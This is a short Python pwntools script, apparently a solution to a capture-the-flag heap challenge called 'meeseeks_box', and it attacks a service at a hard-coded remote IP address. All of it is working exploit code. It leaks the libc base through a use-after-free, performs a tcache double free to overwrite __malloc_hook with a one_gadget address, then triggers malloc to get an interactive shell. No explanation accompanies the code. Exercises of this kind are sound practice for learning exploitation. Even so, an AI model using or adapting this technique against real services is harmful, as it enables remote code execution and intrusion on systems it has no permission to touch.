#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = remote('60.250.197.227', 10005)
#r = process('./meeseeks_box')#, env = {'LD_PRELOAD': './libc.so.6'})
#gdb.attach(proc.pidof(r)[0])

libc = ELF('./libc.so.6')

def create(size, data):
    r.sendlineafter('> ', '1')
    r.sendlineafter('Size: ', str(size))
    r.sendlineafter('Request: ', data)

def show(idx):
    r.sendlineafter('> ', '2')
    r.sendlineafter('ID: ', str(idx))

def delete(idx):
    r.sendlineafter('> ', '3')
    r.sendlineafter('ID: ', str(idx))

create(0x410, 'A')
create(0x10, 'B')

delete(0)
show(0)
libc.address = u64(r.recvline()[:-1].ljust(8, b'\x00')) - 0x3ebca0
print(f'libc base address = 0x{libc.address:x}')

create(0x10, 'C')

delete(0)
delete(0)

create(0x10, p64(libc.symbols['__malloc_hook']))
create(0x10, 'D')
create(0x10, p64(libc.address + 0x10a38c))

r.sendlineafter('> ', '1')
r.sendlineafter('Size: ', '16')

r.interactive()
